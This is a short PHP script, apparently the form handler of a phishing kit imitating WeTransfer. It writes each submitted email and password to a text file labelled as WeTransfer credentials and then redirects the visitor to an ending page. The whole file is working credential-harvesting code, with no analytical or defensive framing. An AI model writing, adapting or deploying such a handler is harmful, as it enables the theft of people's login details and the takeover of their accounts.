<?php


file_put_contents("usernames.txt", 
"WeTransfer Username: " . $_POST['email'] . "
WeTransfer Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>